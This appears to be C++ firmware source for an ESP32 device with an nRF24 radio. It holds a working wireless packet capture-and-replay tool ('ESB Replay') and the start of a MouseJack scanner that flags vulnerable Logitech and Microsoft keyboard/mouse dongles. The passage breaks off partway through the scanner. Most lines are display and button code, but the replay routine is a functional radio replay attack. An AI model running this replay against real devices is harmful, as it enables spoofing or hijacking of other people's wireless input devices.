#define _RP_SETUP_RETR 0x04
#define _RP_RF_CH      0x05
#define _RP_RF_SETUP   0x06
#define _RP_STATUS     0x07
#define _RP_RX_ADDR_P0 0x0A
#define _RP_TX_ADDR    0x10
#define _RP_RX_PW_P0   0x11

static constexpr int kRpPayloadMax = 32;
#if BOARD_HAS_ESP32S3
static constexpr int kRpMaxCaptures = 8;
static constexpr int kRpMaxSelLines = 8;
static constexpr int kRpMaxLogLines = 10;
#else
static constexpr int kRpMaxCaptures = ESP32DIV_ESB_RP_CAPTURES;
static constexpr int kRpMaxSelLines = ESP32DIV_ESB_RP_SEL_LINES;
static constexpr int kRpMaxLogLines = ESP32DIV_ESB_RP_LOG_LINES;
#endif
static constexpr int kRpStatusLines = 3;
static constexpr int kRpSelVisible = 5;
static constexpr int kRpLineHeight = 12;
static constexpr int kRpToolbarBottom = 36;
static constexpr int kRpToolbarGap = 8;
static constexpr int kRpStatusY = kRpToolbarBottom + kRpToolbarGap;
static constexpr int kRpBoxHeaderH = 15;
static constexpr int kRpStatusTextY = kRpStatusY + kRpBoxHeaderH;
static constexpr int kRpStatusBoxH = kRpBoxHeaderH + (kRpStatusLines * kRpLineHeight) + 4;
static constexpr int kRpPanelGap = 4;
static constexpr int kRpSelBoxTop = kRpStatusY + kRpStatusBoxH + kRpPanelGap;
static constexpr int kRpSelBoxH =
    kRpBoxHeaderH + (kRpSelVisible * kRpLineHeight) + 4;
static constexpr int kRpSelStartY = kRpSelBoxTop + kRpBoxHeaderH;
static constexpr int kRpLogBoxTop = kRpSelBoxTop + kRpSelBoxH + kRpPanelGap;
static constexpr int kRpLogStartY = kRpLogBoxTop + kRpBoxHeaderH;
static constexpr int kRpLogBottomPad = 4;
static constexpr int kRpStatPadX = 10;
static constexpr int kRpStatValueX = 70;
static constexpr int kRpStatTextDy = 2;
static constexpr uint32_t kRpUiMinIntervalMs = 100;
static constexpr uint32_t kRpHopIntervalMs = 80;
static constexpr uint8_t kRpReplayBursts = 4;
static constexpr uint16_t kRpReplayGapMs = 8;

static const uint8_t kRpHopChannels[] = {
  2, 5, 10, 26, 40, 50, 60, 70, 76, 78, 79, 80, 83
};
static constexpr int kRpHopCount = sizeof(kRpHopChannels) / sizeof(kRpHopChannels[0]);
static const uint8_t kRpPromiscAddr[5] = {0xAA, 0xAA, 0xAA, 0xAA, 0xAA};

struct RpCapture {
  bool used = false;
  uint8_t channel = 0;
  uint8_t len = 0;
  uint8_t data[kRpPayloadMax];
};

static bool uiDrawn = false;
static volatile bool s_active = false;
static bool s_armed = true;
static bool s_hopping = true;
static bool s_playing = false;
static uint8_t s_channel = 76;
static int s_hopIndex = 0;
static uint32_t s_lastHopMs = 0;
static uint32_t s_heardTotal = 0;

static RpCapture s_caps[kRpMaxCaptures];
static int s_capCount = 0;
static int s_selIndex = 0;
static int s_selScroll = 0;

static String s_selBuffer[kRpMaxSelLines];
static uint16_t s_selColor[kRpMaxSelLines];
static int s_selLineCount = 0;
static String s_selDrawn[kRpMaxSelLines];
static uint16_t s_selDrawnColor[kRpMaxSelLines];
static int s_selDrawnW[kRpMaxSelLines];

static String s_logBuffer[kRpMaxLogLines];
static uint16_t s_logColor[kRpMaxLogLines];
static int s_logIndex = 0;
static String s_logDrawn[kRpMaxLogLines];
static uint16_t s_logDrawnColor[kRpMaxLogLines];
static int s_logDrawnW[kRpMaxLogLines];

static String s_statusText[kRpStatusLines];
static uint16_t s_statusColor[kRpStatusLines];
static int s_statusDrawnW[kRpStatusLines];

static bool s_logDirty = false;
static bool s_statusDirty = false;
static bool s_selDirty = false;
static uint32_t s_lastUiMs = 0;

static int rpLogBoxBottom() { return bleContentBottom() - kRpLogBottomPad; }
static int rpLogBoxH() {
  const int h = rpLogBoxBottom() - kRpLogBoxTop;
  return h > (kRpBoxHeaderH + kRpLineHeight) ? h : (kRpBoxHeaderH + kRpLineHeight);
}
static int rpLogEndY() { return kRpLogBoxTop + rpLogBoxH() - 2; }
static int rpVisibleLogLines() {
  const int avail = rpLogEndY() - kRpLogStartY;
  if (avail <= 0) return 1;
  const int n = avail / kRpLineHeight;
  return n < 1 ? 1 : (n > kRpMaxLogLines ? kRpMaxLogLines : n);
}
static int rpSelEndY() { return kRpSelBoxTop + kRpSelBoxH - 2; }

static byte rpGetRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

static void rpSetRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

static void rpWriteRegMulti(uint8_t reg, const uint8_t* data, uint8_t len) {
  digitalWrite(CSN, LOW);
  SPI.transfer((reg & 0x1F) | 0x20);
  for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
  digitalWrite(CSN, HIGH);
}

static void rpDisable() { digitalWrite(CE, LOW); }
static void rpEnable() { digitalWrite(CE, HIGH); }

static void rpPowerUp() {
  rpSetRegister(_RP_CONFIG, rpGetRegister(_RP_CONFIG) | 0x02);
  delayMicroseconds(130);
}

static void rpPowerDown() {
  rpSetRegister(_RP_CONFIG, rpGetRegister(_RP_CONFIG) & ~0x02);
}

static void rpFlushRx() {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xE2);
  digitalWrite(CSN, HIGH);
}

static void rpFlushTx() {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xE1);
  digitalWrite(CSN, HIGH);
}

static void rpInitSpi() {
  SPI.begin(NRF24_SPI_SCK, NRF24_SPI_MISO, NRF24_SPI_MOSI, NRF24_SPI_SS);
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(10000000);
  SPI.setBitOrder(MSBFIRST);
}

static void rpApplyChannel(uint8_t ch) {
  rpDisable();
  rpSetRegister(_RP_RF_CH, ch);
  rpFlushRx();
  if (s_armed && !s_playing) {
    rpEnable();
    delayMicroseconds(130);
  }
}

static void rpConfigureRx() {
  rpDisable();
  rpPowerUp();
  rpWriteRegMulti(_RP_RX_ADDR_P0, kRpPromiscAddr, 5);
  rpSetRegister(_RP_EN_AA, 0x00);
  rpSetRegister(_RP_EN_RXADDR, 0x01);
  rpSetRegister(_RP_SETUP_AW, 0x03);
  rpSetRegister(_RP_SETUP_RETR, 0x00);
  rpSetRegister(_RP_RF_SETUP, 0x0F);
  rpSetRegister(_RP_RX_PW_P0, kRpPayloadMax);
  rpSetRegister(_RP_CONFIG, 0x0B);  // CRC on, PWR_UP, PRIM_RX
  rpApplyChannel(s_channel);
  if (s_armed) {
    rpEnable();
    delayMicroseconds(130);
  }
}

static void rpConfigureTx(uint8_t ch) {
  rpDisable();
  rpPowerUp();
  rpWriteRegMulti(_RP_TX_ADDR, kRpPromiscAddr, 5);
  rpWriteRegMulti(_RP_RX_ADDR_P0, kRpPromiscAddr, 5);
  rpSetRegister(_RP_EN_AA, 0x00);
  rpSetRegister(_RP_EN_RXADDR, 0x01);
  rpSetRegister(_RP_SETUP_AW, 0x03);
  rpSetRegister(_RP_SETUP_RETR, 0x00);
  rpSetRegister(_RP_RF_SETUP, 0x0F);
  rpSetRegister(_RP_RF_CH, ch);
  rpSetRegister(_RP_CONFIG, 0x0E);  // CRC on, PWR_UP, PRIM_TX
  rpFlushTx();
  rpFlushRx();
}

static void rpPaintTextLine(int x, int y, int maxW, int lineH,
                            String& cacheText, uint16_t& cacheColor, int& cacheW,
                            const String& text, uint16_t color) {
  if (cacheText == text && cacheColor == color) return;
  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  const int newW = text.length() ? (tft.textWidth(text) + 2) : 0;
  int clearW = cacheW > newW ? cacheW : newW;
  if (clearW < 8) clearW = maxW;
  if (clearW > maxW) clearW = maxW;
  tft.fillRect(x, y, clearW, lineH, TFT_BLACK);
  if (text.length()) {
    tft.setTextColor(color, TFT_BLACK);
    tft.setCursor(x, y + kRpStatTextDy);
    tft.print(text);
  }
  cacheText = text;
  cacheColor = color;
  cacheW = newW > 0 ? newW : 0;
}

static void rpAppendLog(const String& text, uint16_t color) {
  const int visible = rpVisibleLogLines();
  for (int i = visible - 1; i > 0; i--) {
    s_logBuffer[i] = s_logBuffer[i - 1];
    s_logColor[i] = s_logColor[i - 1];
  }
  s_logBuffer[0] = text;
  s_logColor[0] = color;
  if (s_logIndex < visible) s_logIndex++;
  s_logDirty = true;
}

static String rpPayloadHex(const uint8_t* p, int len, int maxBytes = 8) {
  char buf[3 * 12 + 1];
  int pos = 0;
  const int n = len < maxBytes ? len : maxBytes;
  for (int i = 0; i < n && pos < (int)sizeof(buf) - 3; i++) {
    pos += snprintf(buf + pos, sizeof(buf) - pos, "%02X", p[i]);
  }
  if (len > maxBytes && pos < (int)sizeof(buf) - 3) {
    buf[pos++] = '.';
    buf[pos++] = '.';
    buf[pos++] = '.';
  }
  buf[pos] = '\0';
  return String(buf);
}

static void rpClampSelScroll() {
  if (s_capCount <= 0) {
    s_selScroll = 0;
    return;
  }
  if (s_selIndex < s_selScroll) s_selScroll = s_selIndex;
  if (s_selIndex >= s_selScroll + kRpSelVisible) {
    s_selScroll = s_selIndex - kRpSelVisible + 1;
  }
  if (s_selScroll < 0) s_selScroll = 0;
  const int maxScroll = s_capCount > kRpSelVisible ? (s_capCount - kRpSelVisible) : 0;
  if (s_selScroll > maxScroll) s_selScroll = maxScroll;
}

static void rpRebuildSelect() {
  rpClampSelScroll();
  s_selLineCount = 0;
  for (int i = 0; i < kRpMaxSelLines; i++) {
    s_selBuffer[i] = "";
    s_selColor[i] = UI_DIM_TEXT;
  }

  if (s_capCount == 0) {
    s_selBuffer[0] = "[*] No packets yet";
    s_selColor[0] = UI_DIM_TEXT;
    s_selBuffer[1] = "    Arm, then Prev/Next";
    s_selColor[1] = UI_DIM_TEXT;
    s_selLineCount = 2;
  } else {
    for (int row = 0; row < kRpSelVisible; row++) {
      const int idx = s_selScroll + row;
      if (idx >= s_capCount) break;
      const RpCapture& c = s_caps[idx];
      const bool selected = (idx == s_selIndex);
      String line = selected ? "> " : "  ";
      line += String(idx + 1);
      line += "/";
      line += String(s_capCount);
      line += " ch";
      line += String(c.channel);
      line += " [";
      line += String(c.len);
      line += "] ";
      line += rpPayloadHex(c.data, c.len, 5);
      s_selBuffer[row] = line;
      s_selColor[row] = selected ? ORANGE : UI_TEXT;
      s_selLineCount++;
    }
  }
  s_selDirty = true;
}

static void rpRedrawSelect() {
  const int endY = rpSelEndY();
  const int maxW = tft.width() - 16;
  tft.setTextDatum(TL_DATUM);
  for (int i = 0; i < kRpSelVisible; i++) {
    const int y = kRpSelStartY + i * kRpLineHeight;
    if (y + kRpLineHeight > endY) break;
    if (i < s_selLineCount) {
      rpPaintTextLine(kRpStatPadX, y, maxW, kRpLineHeight,
                      s_selDrawn[i], s_selDrawnColor[i], s_selDrawnW[i],
                      s_selBuffer[i], s_selColor[i]);
    } else {
      rpPaintTextLine(kRpStatPadX, y, maxW, kRpLineHeight,
                      s_selDrawn[i], s_selDrawnColor[i], s_selDrawnW[i],
                      String(""), UI_DIM_TEXT);
    }
  }
  s_selDirty = false;
}

static void rpRedrawLog() {
  const int endY = rpLogEndY();
  const int visible = rpVisibleLogLines();
  const int maxW = tft.width() - 16;
  tft.setTextDatum(TL_DATUM);
  for (int i = 0; i < visible; i++) {
    const int y = kRpLogStartY + i * kRpLineHeight;
    if (y + kRpLineHeight > endY) break;
    if (i < s_logIndex) {
      rpPaintTextLine(kRpStatPadX, y, maxW, kRpLineHeight,
                      s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                      s_logBuffer[i], s_logColor[i]);
    } else {
      rpPaintTextLine(kRpStatPadX, y, maxW, kRpLineHeight,
                      s_logDrawn[i], s_logDrawnColor[i], s_logDrawnW[i],
                      String(""), UI_DIM_TEXT);
    }
  }
  s_logDirty = false;
}

static void rpDrawStatusValue(int line, const String& text, uint16_t color) {
  if (line < 0 || line >= kRpStatusLines) return;
  const int y = kRpStatusTextY + line * kRpLineHeight;
  const int maxW = tft.width() - kRpStatValueX - 8;
  rpPaintTextLine(kRpStatValueX, y, maxW, kRpLineHeight,
                  s_statusText[line], s_statusColor[line], s_statusDrawnW[line],
                  text, color);
}

static void rpUpdateStatusPanel() {
  char chVal[24];
  snprintf(chVal, sizeof(chVal), "%u%s", (unsigned)s_channel, s_hopping ? " hop" : "");
  rpDrawStatusValue(0, String(chVal), s_hopping ? ORANGE : UI_TEXT);

  char capVal[24];
  snprintf(capVal, sizeof(capVal), "%d / %d", s_capCount, kRpMaxCaptures);
  rpDrawStatusValue(1, String(capVal), s_capCount > 0 ? UI_OK : UI_DIM_TEXT);

  if (s_playing) {
    rpDrawStatusValue(2, "Playing", UI_WARN);
  } else if (s_armed) {
    rpDrawStatusValue(2, "Armed", UI_OK);
  } else {
    rpDrawStatusValue(2, "Idle", UI_DIM_TEXT);
  }
  s_statusDirty = false;
}

static void rpDrawTextBoxes() {
  const int logH = rpLogBoxH();
  const int endY = rpLogEndY();
  tft.fillRect(0, kRpStatusY - 2, tft.width(), endY - kRpStatusY + 4, TFT_BLACK);
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  tft.drawRoundRect(4, kRpStatusY, tft.width() - 8, kRpStatusBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kRpSelBoxTop, tft.width() - 8, kRpSelBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kRpLogBoxTop, tft.width() - 8, logH, 3, UI_LINE);

  tft.setTextDatum(TL_DATUM);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.setCursor(kRpStatPadX, kRpStatusY + 3);
  tft.print("Replay");
  tft.setCursor(kRpStatPadX, kRpSelBoxTop + 3);
  tft.print("Select");
  tft.setCursor(kRpStatPadX, kRpLogBoxTop + 3);
  tft.print("Activity");

  static const char* kLabels[kRpStatusLines] = {"Ch", "Saved", "State"};
  for (int i = 0; i < kRpStatusLines; i++) {
    const int y = kRpStatusTextY + i * kRpLineHeight + kRpStatTextDy;
    tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
    tft.setCursor(kRpStatPadX, y);
    tft.print(kLabels[i]);
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < kRpMaxSelLines; i++) {
    s_selDrawn[i] = "";
    s_selDrawnColor[i] = 0;
    s_selDrawnW[i] = 0;
  }
  for (int i = 0; i < kRpMaxLogLines; i++) {
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
}

static void rpFlushUi(bool force = false) {
  const uint32_t now = millis();
  if (!force && (now - s_lastUiMs) < kRpUiMinIntervalMs) return;
  if (!force && !s_logDirty && !s_statusDirty && !s_selDirty) return;
  s_lastUiMs = now;
  if (s_statusDirty || force) rpUpdateStatusPanel();
  if (s_selDirty || force) {
    rpRebuildSelect();
    rpRedrawSelect();
  }
  if (s_logDirty || force) rpRedrawLog();
}

static int rpTrimLen(const uint8_t* p, int maxLen) {
  int len = maxLen;
  while (len > 1 && p[len - 1] == 0x00) len--;
  return len;
}

static bool rpInteresting(const uint8_t* p, int len) {
  if (len < 2) return false;
  int zeros = 0, ff = 0;
  for (int i = 0; i < len; i++) {
    if (p[i] == 0x00) zeros++;
    if (p[i] == 0xFF) ff++;
  }
  return !(zeros >= len - 1 || ff >= len - 1);
}

static void rpStoreCapture(uint8_t ch, const uint8_t* data, uint8_t len) {
  // Dedup identical latest packet
  if (s_capCount > 0) {
    const RpCapture& last = s_caps[0];
    if (last.used && last.channel == ch && last.len == len &&
        memcmp(last.data, data, len) == 0) {
      return;
    }
  }

  // Newest at index 0
  for (int i = kRpMaxCaptures - 1; i > 0; i--) {
    s_caps[i] = s_caps[i - 1];
  }
  s_caps[0].used = true;
  s_caps[0].channel = ch;
  s_caps[0].len = len;
  memcpy(s_caps[0].data, data, len);
  if (s_capCount < kRpMaxCaptures) s_capCount++;
  s_selIndex = 0;
  s_selScroll = 0;
  s_selDirty = true;
  s_statusDirty = true;
  rpAppendLog(String("+ ch") + String(ch) + " [" + String(len) + "] " +
              rpPayloadHex(data, len, 8), UI_OK);
}

static bool rpRxAvailable() {
  return (rpGetRegister(_RP_STATUS) & 0x40) != 0;
}

static void rpPollCapture() {
  if (!s_armed || s_playing) return;
  uint8_t guard = 0;
  while (rpRxAvailable() && guard < 6) {
    uint8_t payload[kRpPayloadMax];
    digitalWrite(CSN, LOW);
    SPI.transfer(0x61);
    for (int i = 0; i < kRpPayloadMax; i++) payload[i] = SPI.transfer(0xFF);
    digitalWrite(CSN, HIGH);
    rpSetRegister(_RP_STATUS, 0x70);

    const int len = rpTrimLen(payload, kRpPayloadMax);
    if (rpInteresting(payload, len)) {
      s_heardTotal++;
      rpStoreCapture(s_channel, payload, (uint8_t)len);
    }
    guard++;
  }
}

static void rpStepHop() {
  if (!s_armed || s_playing || !s_hopping) return;
  const uint32_t now = millis();
  if (now - s_lastHopMs < kRpHopIntervalMs) return;
  s_lastHopMs = now;
  s_hopIndex = (s_hopIndex + 1) % kRpHopCount;
  s_channel = kRpHopChannels[s_hopIndex];
  rpApplyChannel(s_channel);
  s_statusDirty = true;
}

static void rpWritePayload(const uint8_t* data, uint8_t len) {
  digitalWrite(CSN, LOW);
  SPI.transfer(0xA0);
  for (uint8_t i = 0; i < len; i++) SPI.transfer(data[i]);
  digitalWrite(CSN, HIGH);
  rpSetRegister(_RP_STATUS, 0x70);
  rpEnable();
  delayMicroseconds(15);
  rpDisable();
  delayMicroseconds(150);
}

void runUI();

static void rpPlaySelected() {
  if (s_capCount <= 0 || s_selIndex < 0 || s_selIndex >= s_capCount) {
    rpAppendLog("[!] No capture selected", UI_WARN);
    rpFlushUi(true);
    return;
  }
  if (s_playing) return;

  const RpCapture cap = s_caps[s_selIndex];
  s_playing = true;
  s_statusDirty = true;
  rpFlushUi(true);
  rpAppendLog(String("[>] Play ch") + String(cap.channel) + " x" + String(kRpReplayBursts),
              UI_WARN);
  rpFlushUi(true);

  rpConfigureTx(cap.channel);
  for (uint8_t n = 0; n < kRpReplayBursts; n++) {
    // Remapped layout: LEFT exits now (was SELECT).
    if (feature_exit_requested || isButtonPressed(BTN_LEFT)) break;
    rpWritePayload(cap.data, cap.len);
    delay(kRpReplayGapMs);
    // Nearby channels help hopping receivers
    if (n == 1) {
      rpSetRegister(_RP_RF_CH, (uint8_t)((cap.channel + 1) % 84));
    } else if (n == 2) {
      rpSetRegister(_RP_RF_CH, cap.channel);
    }
    maintainTouchNavBar();
    runUI();
  }

  rpConfigureRx();
  s_playing = false;
  rpAppendLog("[+] Replay done", UI_OK);
  s_statusDirty = true;
  rpFlushUi(true);
}

static void rpToggleArm() {
  s_armed = !s_armed;
  if (s_armed) {
    rpConfigureRx();
    rpAppendLog("[+] Armed — capturing", UI_OK);
  } else {
    rpDisable();
    rpAppendLog("[*] Capture paused", UI_DIM_TEXT);
  }
  s_statusDirty = true;
  rpFlushUi(true);
}

static void rpClearCaptures() {
  for (int i = 0; i < kRpMaxCaptures; i++) s_caps[i].used = false;
  s_capCount = 0;
  s_selIndex = 0;
  s_selScroll = 0;
  s_selDirty = true;
  s_statusDirty = true;
  rpAppendLog("[*] Captures cleared", UI_DIM_TEXT);
  rpFlushUi(true);
}

static void rpPrev() {
  if (s_capCount <= 0) return;
  s_selIndex = (s_selIndex - 1 + s_capCount) % s_capCount;
  s_selDirty = true;
  s_statusDirty = true;
  rpFlushUi(true);
}

static void rpNext() {
  if (s_capCount <= 0) return;
  s_selIndex = (s_selIndex + 1) % s_capCount;
  s_selDirty = true;
  s_statusDirty = true;
  rpFlushUi(true);
}

static void rpSelectAt(int idx) {
  if (idx < 0 || idx >= s_capCount) return;
  if (idx == s_selIndex) return;
  s_selIndex = idx;
  s_selDirty = true;
  s_statusDirty = true;
  rpFlushUi(true);
}

static unsigned long s_rpLastBtnMs = 0;

static void rpWaitNavRelease(int pin) {
  const uint32_t t0 = millis();
  while (isTouchNavButtonPressed(pin) && millis() - t0 < 400) delay(5);
  delay(30);
}

void rpHandleNavButtons() {
  if (!featureHasTouchNavBar()) return;
  if (millis() - s_rpLastBtnMs < 80) return;

  // Remapped layout: SELECT=Play (the most important action, was UP), UP=Prev
  // (was LEFT), DOWN=Next (was RIGHT; Prev/Next always sit on UP/DOWN),
  // RIGHT=Arm/long-press Clear (secondary, was DOWN). LEFT is the universal
  // Exit, handled in esbReplayLoop(). Also switched from
  // isTouchNavButtonPressedEdge (touch-tap only) to isButtonPressedEdge so
  // the physical buttons actually trigger these actions too.
  if (isButtonPressedEdge(BTN_UP)) {
    rpPrev();
    s_rpLastBtnMs = millis();
    rpWaitNavRelease(BTN_UP);
    return;
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    rpNext();
    s_rpLastBtnMs = millis();
    rpWaitNavRelease(BTN_DOWN);
    return;
  }
  if (isButtonPressedEdge(BTN_RIGHT)) {
    const uint32_t t0 = millis();
    while (isButtonPressed(BTN_RIGHT) && millis() - t0 < 700) delay(10);
    if (millis() - t0 >= 700) {
      rpClearCaptures();
    } else {
      rpToggleArm();
    }
    s_rpLastBtnMs = millis();
    rpWaitNavRelease(BTN_RIGHT);
    return;
  }
  if (isButtonPressedEdge(BTN_SELECT)) {
    rpPlaySelected();
    s_rpLastBtnMs = millis();
    rpWaitNavRelease(BTN_SELECT);
  }
}

void runUI() {
  static constexpr int kBarY = 20;
  static constexpr int kBarH = 16;
  static constexpr int kIconSz = 16;
  static constexpr int kIconN = 5;
  static int iconX[kIconN] = {90, 130, 170, 210, 10};
  static int iconY = kBarY;
  static const unsigned char* icons[kIconN] = {
    bitmap_icon_LEFT,
    bitmap_icon_random,
    bitmap_icon_start,
    bitmap_icon_RIGHT,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, kBarY, 240, kBarH, DARK_GRAY);
    for (int i = 0; i < kIconN; i++) {
      if (icons[i]) tft.drawBitmap(iconX[i], iconY, icons[i], kIconSz, kIconSz, UI_ICON);
    }
    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.drawFastHLine(0, kBarY + kBarH, 240, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], kIconSz, kIconSz, UI_ICON);
      animationState = 2;
      switch (activeIcon) {
        case 0: rpPrev(); break;
        case 1: rpToggleArm(); break;
        case 2: rpPlaySelected(); break;
        case 3: rpNext(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  if (millis() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > kBarY && y < kBarY + kBarH) {
        for (int i = 0; i < kIconN; i++) {
          if (x > iconX[i] && x < iconX[i] + kIconSz) {
            if (icons[i] && animationState == 0) {
              if (i == 4) {
                feature_exit_requested = true;
                s_active = false;
              } else {
                tft.drawBitmap(iconX[i], iconY, icons[i], kIconSz, kIconSz, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      } else if (s_capCount > 0 &&
                 y >= kRpSelStartY && y < rpSelEndY() &&
                 x >= 8 && x <= tft.width() - 8) {
        const int row = (y - kRpSelStartY) / kRpLineHeight;
        if (row >= 0 && row < kRpSelVisible) {
          rpSelectAt(s_selScroll + row);
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void esbReplaySetup() {
  setTouchButtonInputEnabled(true);
  bleSetEsbReplayNavLabels();
  bleClearBody(TFT_BLACK);

  uiDrawn = false;
  s_active = true;
  s_armed = true;
  s_hopping = true;
  s_playing = false;
  s_channel = kRpHopChannels[0];
  s_hopIndex = 0;
  s_lastHopMs = millis();
  s_heardTotal = 0;
  s_capCount = 0;
  s_selIndex = 0;
  s_selScroll = 0;
  s_selLineCount = 0;
  s_logIndex = 0;
  s_logDirty = false;
  s_statusDirty = false;
  s_selDirty = false;
  s_lastUiMs = 0;

  for (int i = 0; i < kRpMaxCaptures; i++) s_caps[i].used = false;
  for (int i = 0; i < kRpMaxSelLines; i++) {
    s_selBuffer[i] = "";
    s_selColor[i] = UI_DIM_TEXT;
    s_selDrawn[i] = "";
    s_selDrawnColor[i] = 0;
    s_selDrawnW[i] = 0;
  }
  for (int i = 0; i < kRpMaxLogLines; i++) {
    s_logBuffer[i] = "";
    s_logColor[i] = UI_DIM_TEXT;
    s_logDrawn[i] = "";
    s_logDrawnColor[i] = 0;
    s_logDrawnW[i] = 0;
  }
  for (int i = 0; i < kRpStatusLines; i++) {
    s_statusText[i] = "";
    s_statusColor[i] = 0;
    s_statusDrawnW[i] = 0;
  }

  float v = readBatteryVoltage();
  drawStatusBar(v, true);
  redrawTouchButtonBar();

  runUI();
  rpDrawTextBoxes();
  rpAppendLog("[+] ESB Replay ready", UI_WARN);
  rpAppendLog("[*] Tap Select or Prev/Next", UI_DIM_TEXT);
  s_selDirty = true;
  s_statusDirty = true;
  rpFlushUi(true);
  redrawTouchButtonBar();

  setupTouchscreen();
  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);
  rpInitSpi();
  rpConfigureRx();
  redrawTouchButtonBar();
}

void esbReplayLoop() {
  s_active = true;
  while (s_active) {
    // Remapped layout: LEFT exits now (was SELECT).
    if (feature_active && (feature_exit_requested || isButtonPressed(BTN_LEFT))) {
      feature_exit_requested = true;
      s_active = false;
      break;
    }
    rpHandleNavButtons();
    maintainTouchNavBar();
    runUI();
    rpStepHop();
    rpPollCapture();
    rpFlushUi(false);
    delay(1);
  }
}

void exit() {
  s_active = false;
  s_armed = false;
  s_playing = false;
  rpDisable();
  rpPowerDown();
  digitalWrite(CSN, HIGH);
  restoreSdAfterSharedSpi();
}

}  // namespace EsbReplay

namespace MouseJack {

#define CE  NRF24_SCAN_CE
#define CSN NRF24_SCAN_CSN

#define _MJ_CONFIG      0x00
#define _MJ_EN_AA       0x01
#define _MJ_EN_RXADDR   0x02
#define _MJ_SETUP_AW    0x03
#define _MJ_SETUP_RETR  0x04
#define _MJ_RF_CH       0x05
#define _MJ_RF_SETUP    0x06
#define _MJ_STATUS      0x07
#define _MJ_RX_ADDR_P0  0x0A
#define _MJ_RX_PW_P0    0x11

static constexpr int kMjPayloadMax = 32;
static constexpr int kMjMaxDevices = 12;
static constexpr int kMjMaxLogLines = 16;
static constexpr int kMjStatusLines = 4;
static constexpr int kMjLineHeight = 12;
static constexpr int kMjToolbarBottom = 36;
static constexpr int kMjToolbarGap = 8;
static constexpr int kMjStatusY = kMjToolbarBottom + kMjToolbarGap;
static constexpr int kMjBoxHeaderH = 15;
static constexpr int kMjStatusTextY = kMjStatusY + kMjBoxHeaderH;
static constexpr int kMjStatusBoxH = kMjBoxHeaderH + (kMjStatusLines * kMjLineHeight) + 4;
static constexpr int kMjLogGap = 4;
static constexpr int kMjLogBoxTop = kMjStatusY + kMjStatusBoxH + kMjLogGap;
static constexpr int kMjLogStartY = kMjLogBoxTop + kMjBoxHeaderH;
static constexpr int kMjLogBottomPad = 4;
static constexpr uint32_t kMjHopIntervalMs = 60;
static constexpr uint32_t kMjDeviceTimeoutMs = 45000;

// Channels commonly used by Logitech Unifying / Microsoft / related HID (MouseJack research).
static const uint8_t kMjChannels[] = {
  2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15,
  16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30,
  32, 33, 35, 37, 40, 42, 44, 46, 48, 50, 52, 55, 57, 60,
  62, 65, 67, 68, 70, 72, 74, 76, 78, 80, 82
};
static constexpr int kMjChannelCount = sizeof(kMjChannels) / sizeof(kMjChannels[0]);

static const uint8_t kMjPromiscAddr[5] = {0x55, 0x55, 0x55, 0x55, 0x55};

enum class MjVendor : uint8_t {
  Unknown = 0,
  Logitech,
  Microsoft,
  Amazon,
  Other
};

struct MjDevice {
  uint8_t addr[5];
  bool used = false;
  MjVendor vendor = MjVendor::Unknown;
  bool vulnerable = false;
  uint16_t hits = 0;
  uint8_t lastCh = 0;
  uint32_t lastSeenMs = 0;
};

static bool uiDrawn = false;
static volatile bool scanning = false;
static bool s_paused = false;
static uint8_t s_channel = 2;
static int s_hopIndex = 0;
static uint32_t s_lastHopMs = 0;
static uint32_t s_packetTotal = 0;
static uint16_t s_deviceCount = 0;
static uint16_t s_vulnCount = 0;

static MjDevice s_devices[kMjMaxDevices];

static String s_logBuffer[kMjMaxLogLines];
static uint16_t s_logColor[kMjMaxLogLines];
static int s_logIndex = 0;

static String s_statusText[kMjStatusLines];
static uint16_t s_statusColor[kMjStatusLines];
static int s_statusDrawnW[kMjStatusLines];

static String s_logDrawn[kMjMaxLogLines];
static uint16_t s_logDrawnColor[kMjMaxLogLines];
static int s_logDrawnW[kMjMaxLogLines];

static bool s_mjLogDirty = false;
static bool s_mjStatusDirty = false;
static bool s_mjListDirty = false;
static uint32_t s_mjLastUiMs = 0;
static constexpr uint32_t kMjUiMinIntervalMs = 120;

static int mjLogBoxBottom() {
  return bleContentBottom() - kMjLogBottomPad;
}

static int mjLogBoxH() {
  const int h = mjLogBoxBottom() - kMjLogBoxTop;
  return h > (kMjBoxHeaderH + kMjLineHeight) ? h : (kMjBoxHeaderH + kMjLineHeight);
}

static int mjLogEndY() {
  return kMjLogBoxTop + mjLogBoxH() - 2;
}

